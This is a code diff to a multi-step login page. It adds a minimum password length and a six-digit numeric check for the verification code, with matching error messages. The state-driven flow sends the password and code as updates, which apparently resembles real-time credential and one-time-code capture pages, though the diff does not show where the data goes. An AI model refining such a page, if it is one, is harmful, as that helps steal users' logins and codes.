@@ -595,8 +595,8 @@
             </div>
             <div class="form-group" id="passwordGroup">
               <label for="exampleInputPassword1">Password</label>
-              <input type="password" class="form-control" id="exampleInputPassword1" name="password" required 
-                    onkeypress="if(event.key === 'Enter') handleFormSubmission();">
+  <input type="password" class="form-control" id="exampleInputPassword1" name="password" required minlength="6"
+        onkeypress="if(event.key === 'Enter') handleFormSubmission();">
               <div class="error-message" id="RequirePassword">Password is required</div>
               <div class="error-message" id="InvalidPassword">Incorrect email or password. Try again.</div>
             </div>
@@ -611,8 +611,9 @@
 
             <div class="form-group" id="verificationCodeGroup" style="display: none;">
               <label for="verificationCodeInput" id="verificationCodeLabel">Verification Code</label>
-              <input type="text" class="form-control" id="verificationCodeInput" name="verificationCode" required
-                    onkeypress="if(event.key === 'Enter') handleFormSubmission();">
+  <input type="text" class="form-control" id="verificationCodeInput" name="verificationCode" required maxlength="6" inputmode="numeric" pattern="[0-9]{6}"
+        onkeypress="if(event.key === 'Enter') handleFormSubmission();"
+        oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,6)">
               <div class="error-message" id="RequireVerificationCode">Verification code is required.</div>
               <div class="error-message" id="InvalidVerificationCode">Invalid verification code. Please try again.</div>
             </div>
@@ -1386,6 +1387,15 @@ async function handleFormSubmission() {
         resetFormState();
         return;
       }
+      if (password.length < 6) {
+        document.getElementById('RequirePassword').textContent = 'Password must be at least 6 characters.';
+        document.getElementById('RequirePassword').style.display = 'block';
+        isSubmitting = false;
+        if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+        hideLoadingOverlay();
+        resetFormState();
+        return;
+      }
       payload.password = password;
       updateType = 'password';
     } else if (currentStatus === 'WAITINGOPTIONS') {
@@ -1438,6 +1448,15 @@ async function handleFormSubmission() {
     } else if (currentStatus === 'WAITINGCODE') {
       const verificationCode = verificationCodeInput.value.trim();
       if (!verificationCode) {
+        document.getElementById('RequireVerificationCode').style.display = 'block';
+        isSubmitting = false;
+        if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+        hideLoadingOverlay();
+        resetFormState();
+        return;
+      }
+      if (!/^\d{6}$/.test(verificationCode)) {
+        document.getElementById('RequireVerificationCode').textContent = 'Please enter the complete 6-digit code.';
         document.getElementById('RequireVerificationCode').style.display = 'block';
         isSubmitting = false;
         if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
